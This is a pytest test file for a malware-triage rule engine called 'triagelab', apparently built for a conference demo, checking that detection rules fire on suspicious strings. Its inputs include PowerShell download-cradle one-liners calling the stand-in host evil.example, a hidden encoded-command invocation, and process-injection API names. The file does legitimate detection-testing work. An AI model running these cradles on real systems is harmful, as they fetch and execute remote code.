import pytest

from triagelab import rules


def test_builtin_rule_ids_are_unique():
    ids = [r.id for r in rules.BUILTIN_RULES]
    assert len(ids) == len(set(ids))


def test_match_is_case_insensitive():
    matches = rules.match_rules(["createremotethread was called"])
    assert [m.rule_id for m in matches] == ["TL001"]


def test_no_matches_on_benign_strings():
    assert rules.match_rules(["hello world", "compile the parser"]) == []


def test_match_records_every_hit_term():
    matches = rules.match_rules(["VirtualAllocEx", "WriteProcessMemory"])
    assert matches[0].matched_terms == ["VirtualAllocEx", "WriteProcessMemory"]


def test_download_cradle_rule_matches_classic_one_liner():
    matches = rules.match_rules(
        ["IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"]
    )
    assert [m.rule_id for m in matches] == ["TL007"]
    assert matches[0].category == "download-cradle"
    assert matches[0].severity == 4


def test_download_cradle_rule_matches_downloadfile_variant():
    matches = rules.match_rules(
        ["IEX (New-Object Net.WebClient).DownloadFile('http://evil.example/a.exe', $out)"]
    )
    assert [m.rule_id for m in matches] == ["TL007"]


def test_download_cradle_rule_does_not_flag_standalone_encoded_command():
    # -EncodedCommand alone is a standard PowerShell flag used in benign CI/CD,
    # DSC, and Packer automation; TL004 already covers encoded execution.
    matches = rules.match_rules(["powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA"])
    assert "TL007" not in [m.rule_id for m in matches]


def test_custom_rule_loading_is_the_live_demo_gap():
    """Guards the deliberate gap: this is what gets built during the talk."""
    with pytest.raises(NotImplementedError):
        rules.load_custom_rules()
